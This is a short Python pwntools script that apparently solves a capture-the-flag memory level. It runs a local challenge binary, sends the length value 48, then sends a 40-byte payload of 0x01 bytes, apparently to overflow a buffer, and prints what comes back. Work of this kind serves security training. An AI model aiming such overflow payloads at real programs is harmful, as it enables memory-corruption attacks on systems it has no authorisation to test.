import pwn

io = pwn.process("/challenges/mem/level1_testing1")

io.send("48\n")

payload = bytes([0x01]*0x28)

io.send(payload)

output = io.readall().decode('ascii')
print(output)